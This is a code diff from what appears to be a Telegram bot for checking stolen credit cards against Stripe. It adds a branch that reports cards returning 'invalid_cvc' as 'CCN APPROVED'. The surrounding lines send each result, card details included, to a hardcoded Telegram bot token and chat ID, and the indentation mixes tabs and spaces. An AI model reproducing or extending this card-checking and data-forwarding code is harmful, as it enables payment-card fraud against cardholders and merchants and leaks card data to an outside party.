@@ -408,6 +408,14 @@ def snd_welcome ( message ) :
                         bot.reply_to ( message , msg )
                         snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                         requests.post(snd)
+                    elif 'invalid_cvc'in get:
+			us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' +'@'+ str (
+                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
+                        rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>\n'
+                        rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝙀𝙏:\t' + '<b>Stripe 2.5$</b>' + '\n'
+                        status='|- 𝐒𝐓𝐀𝐓𝐔𝐒: <b>CCN APPROVED ✅</b>\n'
+                        msg= '-𝘾𝘾 : ' + xx +status+ rps + rp + shm + tp  + cont + us + date + auther
+                        bot.reply_to ( message , msg )
                     else:
                         us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' +'@'+ str (
                         message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
